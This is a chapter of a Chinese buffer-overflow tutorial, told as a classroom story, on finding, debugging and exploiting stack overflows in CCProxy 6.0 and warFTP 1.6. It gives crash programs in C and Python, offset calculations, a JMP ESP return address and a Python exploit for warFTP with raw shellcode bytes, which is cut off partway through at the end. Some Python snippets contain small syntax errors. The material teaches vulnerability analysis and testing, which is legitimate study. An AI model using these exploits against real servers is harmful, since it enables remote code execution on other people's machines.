# 第七章、漏洞的发现、分析和利用

12 月，平安夜、圣诞节、元旦，接着就是寒假和春节。整个校园充满了一种节日的氛围和思亲的情绪。

“大家圣诞节准备怎么过啊？”老师喜欢在正式上课前聊聊别的，好让大家的注意力慢慢集中起来。

“我要美美吃上一顿，然后好好睡上一觉！”玉波鼓鼓嘴说。

大家都大笑起来。

“外国人的节有什么好过的，我要好好准备考试，然后回家过春节，与家人团聚！”古风认真的说道。

“对啊，老师，我们接着有很多门的期末考试呢，这门课……”宇强问道。

“嗯，我理解大家的意思！这门课需要真正的实践，要亲自编写才行。纸上的考试并不能检查出什么。而且平时大家也很认真，所以这门课就不进行期末考试了！”

“哦！太好了！”教室里一阵欢腾。

“我会在课中布置一点作业，大家在寒假里完成，下学期开学交来，作为考试的成绩。本学期最后两次课，涉及到一个大家感兴趣的东西——漏洞的发现、分析和利用。”

“好啊！终于讲到漏洞本身了！”大家都很高兴。

“呵呵，不过，我有言在先，难度比较大，也有点麻烦，大家可要仔细和耐心啊！我们先来看一个具体例子——CCProxy 软件的漏洞！”

# 7.1 CCProxy 漏洞的分析

## 7.1 CCProxy 漏洞的分析

“CCProxy 是个代理服务器，支持 HTTP、FTP、Telnet 等多种服务。当有多台主机，而只有一个公网出口时，可将 CCProxy 安装在出口主机上，作为一个代理服务器。其他机器就可通过连接 CCProxy 代理来访问外网。”

老师说：“这种结构特别适合小型网络和个人家庭的使用，典型的 CCProxy 配置如图 7－1。”

![](img/Q 版缓冲区溢出教程 213983.jpg)　　　

“哦！”宇强说道，“那我可以把妈妈打字用的那台 386 也连上网去，以后就不用争电脑打泡泡堂了。”

“寝室里上网也方便了！”大家纷纷说道。

# 7.1.1 CCProxy 的安装与设置

### 7.1.1 CCProxy 的安装与设置

“我们安装一个实际用用吧！安装过程很简单，如同一般软件的安装一样。安装完毕后，启动 CCProxy，其界面如图 7－2。”

![](img/Q 版缓冲区溢出教程 214139.jpg)

“这个界面真是简单明了啊！”玉波瞪大了眼睛。

“是的，设计得很清晰，所有操作一看就知。我们自己设计软件时，也要注意界面的人性化。”老师说道，“如果要对 CCProxy 进行设置，点击工具栏上的‘设置’按钮，弹出设置对话框，如图 7－3。”

![](img/Q 版缓冲区溢出教程 214259.jpg)

“所有常用的服务都已经配置好了。我们看，HTTP 代理服务采用的是 808 端口。所以在内部其他机器上，点击 IE 菜单的‘工具栏→Internet’选项，在弹出对话框中选择‘连接’选项卡，再点击‘局域网设置’，就可设置浏览器的代理为安装 CCProxy 主机的 IP，端口为 808，如图 7－4。”

![](img/Q 版缓冲区溢出教程 214403.jpg)

“这下可以通过 CCProxy 代理浏览外面的网页了。”

“哦，好爽啊！”

“嗯，除了 808 端口，CCProxy 还开放了 1090、2121 等端口。CCProxy 6.0 版本有多处漏洞，这里我们就分析对 808 端口请求超长‘GET’字符串时，会引发的缓冲区溢出漏洞。”

# 7.1.2 漏洞的定位和利用

### 7.1.2 漏洞的定位和利用

“我们用 VC 写一个程序，往 CCProxy 的 808 端口发送超长字符串，其格式如下：”

```
GET \AAAAAAAAAAAAAA（4085 个 A） HTTP/1.0\x0D\x0A\x0D\x0A 
```

“发送程序 4085byte.cpp（光盘有收录）比较简单，就是网络通信的客户端程序。给出源代码如下，大家可以再巩固一下 socket 编程。”

```
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
int main()
{
    WSADATA ws;
    SOCKET s;
    int ret;
    char buf[5000];
    int i;
    int nLen;
    //初始化 wsa
    WSAStartup(MAKEWORD(2,2),&ws);
    //建立 socket
    s=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //连接对方 808 端口
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(808);
    server.sin_addr.s_addr=inet_addr("192.168.3.151");
    //连接！
    if (connect(s,(struct sockaddr *)&server,sizeof(server) ) < 0)
    {
        printf("connect error");
        return -1;
    }
    nLen = 0;
    strcpy(buf, "GET /");
    nLen += sizeof("GET /")-1;
    for(nLen; nLen<4080+5; nLen++)
    {
        buf[nLen] = 'A';
    }
    buf[nLen] = '\0';
    strcat(buf, " HTTP/1.0\x0D\x0A\x0D\x0A");
    nLen += sizeof(" HTTP/1.0\x0D\x0A\x0D\x0A")-1;
    //构造字符串后，发送
    send(s, buf, nLen , 0);
    printf("send OK!");
    closesocket(s); 
    WSACleanup(); 
    return 0;
} 
```

“嗯，就是初始化→建 Socket→连接→发送！”宇强总是能看透本质。

“对！请注意，发送数据的格式一定要保证正确，前导字符是‘GET /’，然后是大量的字符‘A’，而结束字符是‘HTTP/1.0\x0D\x0A\x0D\x0A’。这样才能让 CCProxy 认为是 HTTP 的请求，从而处理它。”

“哦！‘\x0D\x0A’代表什么呢？”古风问道。

“这是 HTTP 协议中规定的请求结束标志，具体可以参看 RFC 文档！”老师回答道，“我们发送给代理服务器后，CCProxy 发生缓冲区溢出，就会弹出出错对话框，XP 下如图 7－5。”

![](img/Q 版缓冲区溢出教程 215831.jpg)

“哎哟，和 Win2000 的不一样也，看不到出错时 EIP 的值！”玉波嚷道。

“不，我们也可以看。点击蓝色的字——‘请单击此处’。就可看到图 7－6 的报错框。其中第二排有 Offset：41414141’ 。表示执行 0x41414141，就是‘AAAA’的 16 进制！”

![](img/Q 版缓冲区溢出教程 215967.jpg)

“哦，那还是和 Win2000 下的一样了！”宇强满意的说，“我们只需改变 buf 的赋值过程，分别定位千位、百位、十位和个位就可以了。”

“是的！”古风就要去改变程序了。

“等等，等等！”老师急阻止，“定位我们已经详细的讲过了，这里不是重点。具体的定位程序下来大家参考 CCProxy1.cpp、CCProxy2.cpp、CCProxy3.cpp、CCProxy4.cpp（光盘有收录），它们分别定位千位、百位、十位和个位。”

“大家下去可自己练习一下。通过它们，我们可定位出：从 4052 个 A 开始的地方就是返回点。当然，验证还是有必要的，我们把数组全部赋为 A，而 4052 开始的 4 个字节赋为 B，构造如下：”

```
for(i=0; i<4080; i++,nLen++)
buf[nLen] = 'A';
buf[4047+5] = 'B';
buf[4048+5] = 'B';
buf[4049+5] = 'B';
buf[4050+5] = 'B'; 
```

“重新启动 CCProxy，运行修改过后的测试程序。这次弹出的对话框如图 7－7，果然是 42424242 覆盖到了返回点。”

![](img/Q 版缓冲区溢出教程 216460.jpg)

“证明的确是 4052 的地方覆盖了返回点。有了返回点的位置，写出利用程序简直就是轻车熟路了！”老师说道。

“是啊，我们覆盖 4052 个 A，然后是 JMP ESP 的地址，这个是……是……”玉波挠了挠后脑勺。

古风一口答道：“是 0x7FFA4512。”

“对！最后跟上 ShellCode，按照下面这个格式就行了。”

```
GET /AAAA(4052 个 A)… JMP ESP 地址 SHELLCODE HTTP/1.0 
```

“嗯！是的。”老师补充道，“但因为覆盖了 4052 个字节，所以我们可以把 ShellCode 放在前面，而在 JMP ESP 的地址后放一个 JMP BACK 的指令，跳回到 ShellCode 中。格式就像这样：”

```
GET \ AAAA…AA ShellCode 0x7FFA4512 JMPBACK HTTP/1.0 
```

大家都点头称是。

“4000 多个字节，不用实在浪费了，而且加在后面，反而可能会引发异常。好！ShellCode 用完成开端口功能的代码。我们构造出利用程序 JmpEspShell.cpp（光盘有收录）。执行！登陆成功！如图 7-8。”

![](img/Q 版缓冲区溢出教程 216938.jpg)

# 7.1.3 漏洞的分析

### 7.1.3 漏洞的分析

“Yeah！成功！”大家都叫了起来，然后纷纷说道，“虽然成功利用过多次，但真的对一个新漏洞利用成功了，还是有点激动的，呵呵！”

“这很好啊！其实正是这些小小的成就，让你品尝到了努力成功后的喜悦。这样才能触动你的进一步发展，实现真正的成功。”老师说道。

“好了，进入我们的重头戏，来分析漏洞的成因吧！”

“好啊！这下可以看看实际程序中的漏洞是怎样出现的了。”大家高兴的说。

“首先启动我们的调试利器——SoftICE。”

“嗯，在 jmp esp 转换成 call ebx 的利用方式那里我们使用过，果然很强大！”古风真是好记性。

“这位同学记忆力真好！这里我们会进一步深入使用它。启动 CCProxy，再重新发送全‘A’的过长数据。

因为会产生异常，所以 SoftICE 就会捕获异常，自动弹出来。停在了下面这句话：”

```
001B : 41414141 INVALID 
```

小知识：

SoftICE 默认情况下是开了异常捕获功能的。即有什么异常发生时，会自动激活 SoftICE。我们可使用指令 Fault on 和 Fault off 来打开或关闭异常捕获功能。

“ 001B : 41414141 INVALID 意思是 41414141 指向的指令非法。”老师解释道。

“哦！那些指令究竟是什么数据呢？”宇强进一步问道。

“在 SoftICE 下，我们输入 code on 命令显示机器码，就可以看到对应的地方全是 FFFF 数据。”

```
001B : 41414141 FFFF INVALID 
```

“哦！”

“我们再看看上下左右相关的数据吧，输入 data 命令，就会出现一个数据窗口。然后输入 d eip ，就会在数据窗口中显示出如下的值。”

```
001B : 41414141 ？？ ？？ ？？　？？　？？ ？？
001B : 41414151 ？？ ？？ ？？　？？　？？ ？？ 
```

“上下左右都是非法的啊？”

“是的，因为没有代码加载在这个部分，所以系统默认填充 1，就是全 F。”老师解释道，“而我们的关键，就是要找到发生问题的那段程序。”

“我们看看现在堆栈里面的值，和前面类似，这里用命令 d esp ，就出现了现在堆栈数据的情况。”

```
esp ＝ 012A790C
0023:012A790C 41 41 41 41 41 41 41 41－4 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0023:012A791C 41 41 41 41 41 41 41 41－4 41 41 41 41 20 48 54 AAAAAAAAAAAAA HT
0023:012A792C 54 50 2F 31 2E 30 0D 0A TP/1.0 
```

“原 EIP 和堆栈都已被我们过长的数据覆盖，我们无法从现今的堆栈中找到问题代码的位置。”

“是啊！怎么办呢？”小倩着急的说道。

“我们先推理一下。现在 ESP＝012A790C，程序返回后，堆栈指针 ESP 会指向 012A790C；所以应该是某个函数（假设是函数 A）执行前把返回地址存在了 012A790C－4 或附近中；然后在函数 A 执行过程中作了无长度限制的字符串拷贝，使返回地址被覆盖成了我们发送的 41414141！”

“那个函数 A 就是有问题的函数；而无长度限制的字符串拷贝就是 Strcpy、Strcat 一类的操作。”

“哦，难道我们要猜测哪个函数 A 在 012A790C 附近中保存了返回地址？”宇强说道。

“非常正确！”老师特别高兴，“第一种方法：用 bpx 命令往 Strcpy、Strcat 等函数入口处设断点，然后返回函数 A 的空间，看是否会出现覆盖问题。”

“第二种方法，因为函数 A 会往 012A790C 附近写入返回地址，所以我们设置断点，在往 012A790C 这个地址写东西时中断下来，看能否找到有问题的函数 A。”

“我们这里用第二种方法。”

“退出 SoftICE，回到 Windows 下重新启动 CCProxy。再进入 SoftICE 输入 addr proxy ，表示进入进程空间；然后输入 bpmd 012A790C w ，表示往 012A790C 写东西时停下来。”

大家眼睛都看得直直的，小倩也在边听边记。

“好，设置完毕后，我们再运行攻击代码，这样，当往 012A790C 写入的时候，就会被 SoftICE 中断。”

“运行过程中，会有好几次中断，但显然都不是保存函数返回地址的操作，我们按 F5 继续让它执行。终于到了下面这句时，SoftICE 被中断弹出。”老师指住下面的指令说。

```
0040F2A0 : call 0040A410 
```

“此时 ESP＝012A790C， 即先把返回地址保存在 012A790C 中，然后跳到 0040A410 函数内部执行。根据我们的猜测，相信就是这个函数在处理时，返回地址被覆盖了。”

“函数中究竟是什么东西导致错误了呢？我们跟进去看看吧！按 F8 动态跟踪进 0040A410 函数内部。”

“哎哟！这里全是反汇编的代码，怎么能看懂啊？”玉波嚷了起来。

“直接让你看出有问题的地方，的确比较困难。但我们是在动态跟踪啊！当有 Push push call 时，我们就知道这是在调用函数，然后可以通过 d 命令来查看参数究竟是什么。”

“我们实际来使用一遍吧！当执行到 0040A5F8： 55 push EBP 这句时，我们输入 d EBP ，发现压入的参数内容是：”

```
192.168.3.150 unknown Web GET /AAAAAAAAAAAAAAAAAAAAAAAAA 
```

“哦！就是我们发送的字符串多了一些东西！”

“越来越近了！就要水落石出了吧！”大家议论纷纷。

“嗯！我们继续。接下来是这句指令：”

```
0040A5F9： 51 push ECX 
```

“输入 d ecx 命令，发现内容是时间信息。为： 2004-11-25 16:46:56 。”

“下一句： 0040A601: PUSH 0046F110 。我们输入 d 0046F110 命令，发现是 [%s] %s 格式化串！”

“最后，PUSH edx，再 Call 一个函数。我们根据分析参数的内容，知道应该是执行下面类似的函数。”

```
wwspritnf ( edx,
    [%s] %s
    2004-11-25 16:46:56
    ### 192.168.3.150 unknown Web GET /AAAAAAAAAAAAAAAAAAAAAAAAA
) 
```

“这个拷贝操作是把日期、时间和我们发送的过长字符串，拷贝到 EDX 指向的内存中；因为没有字符串长度的限制，所以把保存的 EIP 也覆盖了，从而导致溢出。”

“哦！原来漏洞真的是这样产生的啊！”同学们说道。

“我们通过代码来计算一下覆盖点的位置和长度。此时 EDX＝012A6904，为字符串保存的起始地址；而 ESP＝012A790C，为保存的函数返回地址。”

“两个位置相减，ESP－EDX＝012A790C－012A6904＝0x1008＝4104。那么，就是要覆盖 4104 那么长的字符串，才能到达函数返回地址。”

“刚才，我们定位得到的 A 的长度是？”老师问道。

“4056！”古风一口报了出来。

“哇！好记性！大家看看参数，除了我们的 A，还包括日期、时间、IP、unknow WEB 和 GET 等字符串，再加上格式化输出 [%s ] %s 中的‘['字符']’字符和一个空格，大家数数有多长！”

“嗯，一共是 48 个字节。”古风很快的数完后说道。

“对！所以我们覆盖的 A 正好是：分配空间－其他字符长度＝4104－48＝4056！”

“哦！原来是这样啊！”

“我们继续执行。果然，保存的 EIP 被覆盖；所以，就是这个函数的执行导致了缓冲区溢出，分析成功！”

小结漏洞分析过程：

1.启动有漏洞程序，启动 SoftICE 并打开异常捕获开关（默认打开）；

2.发送过长的字符串，引发程序的异常，SoftICE 弹出；

3.查看此时的 ESP 的值并记下，假设是 AAAA；

4.退回用户空间，重新启动漏洞程序；

5.按 CTRL＋D 进入 SoftICE，用 addr 命令进入程序空间；再用 bpmw AAAA w 设置写断点；

6.再次发送过长字符串；

7.SoftICE 会在往 AAAA 地址写操作时弹出来；我们可分析是哪一个函数在该点保存了返回地址；

8.跟入该函数；注意用 d 命令查看里面调用的各函数参数的值；当发现某个函数有我们发送的过长字符串和‘%s’一类的参数时，就仔细分析，多半是该操作的问题！从而分析清楚漏洞产生的原因。

# 7.2 黑盒法探测漏洞和 Python 脚本

## 7.2 黑盒法探测漏洞和 Python 脚本

“哇！好啊！”大家都情不自禁的鼓起掌来。

“怎么样？大家有收获吗？”老师向台下问道。

“有啊，不仅知道了程序有溢出漏洞，溢出点在哪个位置，还知道了为什么会有漏洞。”古风说道，“不仅知其然，还知道了其所以然！”

“看来实际的软件存在溢出漏洞，还是用了 Strcpy 这类没有限制长度的拷贝啊！”小倩眨了眨眼。

“嗯，更知道了调试分析漏洞的方法！”玉波满意的说道。

“对！这个才是最重要的！”老师笑着说，“这样，大家以后才能独自分析新的漏洞、新的特例。真正在解决问题中提高自己。”

“但，我感觉漏洞的发现还是有偶然性啊！”宇强说，“需要正好发这个包时，程序崩溃了，才能发现漏洞，要有好大的运气啊！”

“虽然的确有一定的偶然性，但只要我们按照一定的方法，遵循一定的规则，就可在尽量短的时间内，尽量多的发现存在的缺陷。”老师说道，“这就是测试的基本原理；而测试，分为黑盒测试和白盒测试两种。”

# 7.2.1 黑盒测试原理

### 7.2.1 黑盒测试原理

“黑盒法测试，是在不知道软件内部结构、程序流程和处理代码的情况下，从软件声称的功能出发，测试检测每个功能是否都能正常使用。”

“所以黑盒测试也称功能测试，它把程序看作一个不能打开的黑盆子，在完全不考虑程序内部结构和内部特性的情况下，在程序接口进行测试。”

“我们无法证明一个程序是正确的，哪怕是一个很简单的程序。”老师喝了口水后说道。

“唔？什么意思？”古风不解的问。

“因为我们要证明一个程序是正确的，就需要对所有的输入都证明，且得到正确的结果，而这是不可能的！”

“举个例子，比如，两个整数 a，b 的相加程序，z＝a＋b，这个简单吧？我们要验证其正确性，就得把 a，b 所有的取值都输入计算一遍，看输出的结果是否正确。”

“在 VC 里，整型的范围是 32 位，大概就是－2×10E9～＋2×10E9，所以计算机能表示的整数的个数大概是 4×10E9 个。对 a 和 b 两个整数来说，其取值的组合个数就是 4×10E9×4×10E9＝16×10E18 种！”

“假设我们 2 秒中验证一个测试数据，那么就需要 16×10E18/2＝8×10E18 秒＝25×10E10 年！就是 200 多亿年的时间！”

“啊！不算不知道，一算吓一跳！”玉波瞪大了眼镜。

“是啊！所以如果我们现在写一个 z＝a＋b 的程序并开始证明其正确性，那么就要等到 200 亿年之后才能宣布。200 亿年？宇宙可能都不存在了！”

“哈哈！是啊！”大家都笑了起来。

“而且测试不仅要考虑测试合法的输入，还要考虑非法的可能输入。所以理论上，测试情况应该有无穷多个！只用把这无穷多个都测试完毕了，我们才能证明某个软件是正确的！所以，测试不是为了证明软件是正确的，因为我们无法证明，而是为了尽可能的发现迄今为止没有发现的漏洞！”

“哦！”

“所以，测试是很讲究方法和策略的，以满足用尽可能少的用例和时间，发现尽可能多的漏洞。”“

小知识：

黑盒测试方法主要有等价类划分、边值分析、因果图、错误推测等。

等价类划分：把所有可能的输入数据划分成若干部分（子集），然后从每一个子集中选取少数具有代表性的数据作为测试用例。

边界值分析：因为大量的错误是发生在输入或输出范围的边界上，而不是发生在输入输出范围的内部，因此，针对各种边界情况设计测试用例，可以查出更多的错误。

因果图方法：考虑输入条件之间的联系、相互组合等。采用一种适合于描述对于多种条件的组合，相应产生多个动作的形式来考虑设计测试用例，这就是因果图（逻辑模型）。.

“比如，我们要对 CCProxy 处理 HTTP 协议的部分进行黑盒测试，就可以对 HTTP 协议进行分类。对协议的每一个字段分别测试长度要求的最小值和最大值；或按一定的比例增加测试字符串的长度。这样就争取用最少的测试用例发现漏洞。”

“哦！”

“而对于黑盒测试来说，首选是使用 Python 语言。”

# 7.2.2 Python 简介

### 7.2.2 Python 简介

“Python 是种脚本语言。使用简单，但功能很强大，特别是构造测试用字符串时很方便；而且集成了很多现成的应用协议，使用 Python 测试，很容易发现漏洞。”

小知识：脚本语言

脚本语言是类似 DOS 批处理、UNIX Shell 程序的语言。脚本语言不需要每次编译再执行，并且在执行中可很容易地访问正在运行的程序，甚至可动态修改正在运行的程序，适用于快速开发以及完成一些简单任务。解决问题需要诸如可变长度字符串等数据类型，这样的数据类型在脚本语言中十分容易，而 C 语言则需要很多工作才能实现。

“哎哟，第一次听说，还什么都不懂，怎么测试啊？”古风说道。

“呵呵，大家有了 C 语言的基础，使用 Python 简直是轻松之极。我们先来安装吧！要安装 Python 和 pyOpenSSL。在 Windows 环境下，当然安装 Windows 版本的 Python 了，推荐安装 Python 2.2.x 的版本，因为可以找到 For Python 2.2.x 的 Win32 编译版，比较方便。当然我们也可自己编译成 for Win 版，安装过程如图 7-9、图 7-10。”

![](img/Q 版缓冲区溢出教程 222614.jpg)

![](img/Q 版缓冲区溢出教程 222616.jpg)

“安装完毕后，我们任意新建一个文件，改成.py 后缀名，可以看见为 py 文件变为了一个蟒蛇图标，如图 7-11，说明 Python 安装成功。”

“hoho！图标好可爱啊！”小倩等几个女生说道。

“嗯，但其实和蟒蛇无关，命名是由 BBC 的‘Monty Python's Flying Circus’节目而得。不过使用起来，大家会感到它的确比较可爱。”

![](img/Q 版缓冲区溢出教程 222792.jpg)

“我们点击‘开始→程序’里面的‘Python2.2→Python (command line)’，就可进入 Python 的解释程序界面，如图 7-12。”

![](img/Q 版缓冲区溢出教程 222870.jpg)

“进入解释程序的环境后，解释程序处于交互状态。在这种状态下，系统提示输入下一个命令，这一般是三个大于符号（即>>>），如果键入文件尾符号——Windows 中为‘Control-Z’，就可正常退出解释程序，如图 7-13。”

![](img/Q 版缓冲区溢出教程 222985.jpg)

“我们来看一个简单例子，看看怎么使用。”

“Hello World？”大家都知道一般的入门是写个 Hello World 程序。

老师一本正经的说：“不，这个太简单了，我们输出‘Hello，ww0830’吧！”

“晕！不是一样的啊！”

“呵呵，你们也可改成自己的名字啊！当看到自己的名字成功打印出来时，就会感到很有成就感，更能鼓励自己！Python 在输入提示符‘>>>’下时，是工作在交互模式。输入命令就会马上执行，然后又会等待输入下一条执行。我们输入 print 'hello ww0830! ' ，就会马上打出来，如图 7-14。”

![](img/Q 版缓冲区溢出教程 223254.jpg)

“该交互模式可用于测试短小语句的执行效果；也可测试较大系统中的部分组件。但缺点是不能保存这些指令，如果要反复输入时也比较麻烦。所以，我们可用文本编辑器编辑命令，然后存为 py 后缀名的文件。以后就可以一直使用了。”

“我们打开记事本，输入如下命令：”

```
import sys
print sys.argv 
```

“然后另存为 test.py。这两句指令输出该 py 文件执行时带的参数。我们在 DOS 提示符下运行，结果如图 7-15。”

![](img/Q 版缓冲区溢出教程 223470.jpg)

“其实，Python 最方便的地方，一个是构造字符串，另一个是本身已经封装好了很多网络协议，我们可直接使用它来探测软件对网络协议的处理，以期望发现漏洞。”

“好了，介绍就到这里。我们实际用 Python 来写网络协议的测试用例吧！”

“啊！Python 的网络编程还不是很了解呢！”古风担心的说道。

“没关系，我会给出详细解释的。而且有了 C 语言编写网络程序的基础，你们会发现用 Python 的确很可爱。但关键的，还是要明白思路。”

# 7.2.3 实例——Python 探测 CCProxy 漏洞

### 7.2.3 实例——Python 探测 CCProxy 漏洞

“我们用 Python 来对刚才讲解的 CCProxy 漏洞进行探测和定位。”

“刚才使用 VC 编程进行探测时，构造超长字符串很麻烦，而且又要建 Socket，又要连接。但我们用 Python 写一个探测 CCproxy 漏洞的程序则非常简单，只需下面四句。”

```
>>> import httplib
>>> conn = httplib.HTTPConnection("192.168.3.151:808")
>>> a = 'A'*4080
>>>conn.request("GET",a) 
```

“看，192.168.3.151 上的 CCProxy 崩溃了，定位报错框如图 7-16，就是 0x41414141 覆盖了函数返回点。测试完成！”

![](img/Q 版缓冲区溢出教程 224029.jpg)

“啊？这就行了啊？”大家一愣，然后回过神来嚷道，“用 Python 写测试程序太容易了吧！”

“呵呵，是的，如图 7-17。”

![](img/Q 版缓冲区溢出教程 224093.jpg)

“解释一下图 7-17，第一句‘import httplib’是加载 http 协议包，Python 封装了很多协议包，我们直接使用就可以了；第二句‘conn = httplib.HTTPConnection("192.168.3.151:808")’就是使用协议包里面的函数，连接目标机 192.168.3.151 的 808 端口；第三句‘a = 'A'*4080’构造 4080 长度的‘A’赋与变量 a，这是脚本的优势，直接用‘*’就可构造指定长度的字符串；最后一句是‘conn.request("GET",a)’，即把字符串 a 作为 http 的 get 请求发送过去。”

“进一步，我们用 Python 定位千位，只要发送如下字符串就可以了。”

```
import httplib
conn = httplib.HTTPConnection("192.168.3.151:808")
s = 'A'*1000+'B'*1000+'C'*1000+'D'*1000+'E'*80
conn.request("GET",s) 
```

“报错对话框显示为 Offset: 45454545 ，说明千位是 0x45-0x41 = 4。如图 7-18。”

![](img/Q 版缓冲区溢出教程 224605.jpg)　　

“依次类推，我们可以定位十位，就是 4000 个 A，然后 10 个 A，10 个 B，10 个 C……程序如下：”

```
import httplib
　　conn = httplib.HTTPConnection("192.168.3.151:808")
　　s = 'A'*4000+A'*10+'B'*10+'C'*10+'D'*10+'E'*10+'F'*10+'J'*10+'H'*10
　　conn.request("GET",s) 
```

“报错对话框显示为 Offset: 46464646 ，说明十位是 0x46-0x41 = 5。”

“最后定位个位。是在 4050 个 A 后，输入 A 到 J 十个字符，程序如下：”

```
import httplib
　　conn = httplib.HTTPConnection("192.168.3.151:808")
　　s = 'A'*4000+A'*50+'ABCDEFGHIJ'
　　conn.request("GET",s) 
```

“这次报错对话框显示为 Offset: 47474747 ，说明个位是 0x47-0x41 = 6。返回点轻松定出，就是 4000＋50＋6＝4056，定位完成！”

“有了返回点，攻击利用程序的编写也很简单，把各个字符串段用‘＋’号连起来就 OK 了。攻击程序参看 CCProxy.py（光盘有收录）。我们测试，也成功！”

“哇！实在是太快、太方便了，就跟方便面一样！”玉波说道。

“呵呵，是啊！Python 既有脚本语言构造字符串的优势，又有很多现成的网络协议包可以使用，所以黑盒测试是 Exploit 编写的必备良药！”

“还有许多使用 Python 语言探测漏洞的自动工具和方法。”老师说道，“推荐使用 fusser.py 程序，它可对 SMTP、FTP、POP3 服务器进行自动检测。”

老师介绍完后说道，“我给大家布置一个作业，用 fusser.py 检查 warFTP1.6 的漏洞，并试着分析一下利用方法和漏洞的成因。Ok？今天就到这里，放学！”

# 7.2.4 Python 探测 warFTP 漏洞

### 7.2.4 Python 探测 warFTP 漏洞

小强日记之五

11 月 29 日 阴

今天，老师布置了作业，涉及漏洞的利用和分析。我一点也不敢懈怠。下课后告别小倩回到家中，匆匆吃完饭后就坐在电脑前看老师推荐的 Fusser。

在网站上下载了一个 Fusser 1.0（光盘也有收录），直接在命令行下敲 fuzzer.py ，就会给出使用帮助信息，即主机 IP、端口、探测协议。如图 7-19。

![](img/Q 版缓冲区溢出教程 225661.jpg)

我琢磨如何利用它进行自动探测呢？想了想，不如把 warFTP 安装好，直接测试！

再下载了一个 warFTP 1.6 版本（光盘有收录），安装后其界面如图 7-20。同样简洁明了，但没有 CCProxy 那样规范，有点随意化。

![](img/Q 版缓冲区溢出教程 225770.jpg)

输入 `fuzzer.py 192.168.3.151 21 ftp` ，尝试着测试一下 FTP 协议，哇！一下就报出探测到漏洞了：Bug found，如图 7-21。自动化就是好啊！

![](img/Q 版缓冲区溢出教程 225860.jpg)

根据提示，看来是处理 User 名的时候有溢出问题！于是边回忆老师讲的内容，边用 Python 构造字符串实现定位。看了看 Python 的帮助，自己试着写了个 FTP 协议的探测程序。首先加载 FTP 协议包，然后连接 FTP，发送超长的用户名，程序如下：

```
from ftplib import FTP
ftp = FTP('192.168.3.151')
ftp.login( 'A'*500,'ww') 
```

哈哈，一下子就成功了！warFTP 没有反应，挂掉了。如老师所说，有了一门语言的基础，对比学习另一门语言，是个很快的过程。

看来 500 个字节的用户名实现了溢出，但没有出错对话框弹出，所以要用 OllyDbg 来帮助定位。我先重新启动 warFtp，再用 Ollydbg 加载程序。如图 7-22 和图 7-23。

![](img/Q 版缓冲区溢出教程 226212.jpg)

![](img/Q 版缓冲区溢出教程 226214.jpg)

重新执行刚才的程序，这下 Ollydbg 截获了异常！41414141 不能执行，就是我们发送的字符串。如图 7-24。

![](img/Q 版缓冲区溢出教程 226274.jpg)

重启 warFTP，我发现只需用“Debug”菜单下的“Restart”就可重新启动并加载程序了，而且加的注释也不会丢失，如图 7-25。这下方便多了！

![](img/Q 版缓冲区溢出教程 226352.jpg)

一不小心就发现了一个小技巧，我暗自得意了一会儿，然后就考虑定位了。

经过这学期的学习，定位的方法我已经牢牢掌握了。首先定位百位，ABCDE 各占 100，程序如下：

```
from ftplib import FTP
ftp = FTP('192.168.3.151')
s = 'A'*100 + 'B'*100+'C'*100+'D'*100+'E'*100
ftp.login( s,'ww') 
```

Ollydbg 截获异常，如图 7－26。

![](img/Q 版缓冲区溢出教程 226579.jpg)

0x45454545 不能执行，0x45 是“E”，E－A＝4，即是 400 多的地方到达异常点。

百位是 4，再定位十位。先是 400 个 A，然后在 ABCD……各发 10 个，程序如下：

```
from ftplib import FTP
ftp = FTP('192.168.3.151')
s = 'A'*400 +'A'*10 + 'B'*10+'C'*10+'D'*10+'E'*10+'F'*10+'G'*10+'H'*10+'I'*10+'J'*10
ftp.login( s,'ww') 
```

这次是 49 到达返回点，如图 7－27。49－41＝8，就是 80 多。

![](img/Q 版缓冲区溢出教程 226860.jpg)

最后一次，定位个位。先是 480 个 A，然后是“'ABCDEFGHIJ'”，程序如下：

```
from ftplib import FTP
ftp = FTP('192.168.3.151')
s = 'A'*400 +'A'*80+ 'ABCDEFGHIJ'
ftp.login( s,'ww') 
```

这次是 46474849 到达返回点，截获的图如图 7－28。

![](img/Q 版缓冲区溢出教程 227043.jpg)

所以个位是 0x46－0x41＝5。400＋80＋5＝485！我们把 485 的地方改为 BBBB，其余全为 AAAA，检验一下。

```
from ftplib import FTP
ftp = FTP('192.168.3.151')
s = 'A'*485 +'BBBB'+'AAAA'
ftp.login( s,'ww') 
```

测试，果然是 42424242 报错！轻松搞定定位溢出点！

然后就考虑利用了，构造是： USER A*485 + RET + ShellCode

在 Python 中，直接加 ShellCode 就可以了，构造起来真爽！嗯？怎么有不能写的错误，如图 7－29。

![](img/Q 版缓冲区溢出教程 227333.jpg)

添几个 NOP 看看，改进构造为： USER A*485 + RET + 32 个 Nop ＋ ShellCode

程序如下：

```
from ftplib import FTP
ftp = FTP('192.168.3.151')
sc = 'A'*485 +'\x12\x45\xFA\x7F' + '\x41'*32
sc += "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
sc +="\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
sc +="\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
sc +="\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
sc +="\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
sc +="\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
sc +="\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
sc +="\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
sc +="\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
sc +="\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
sc +="\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
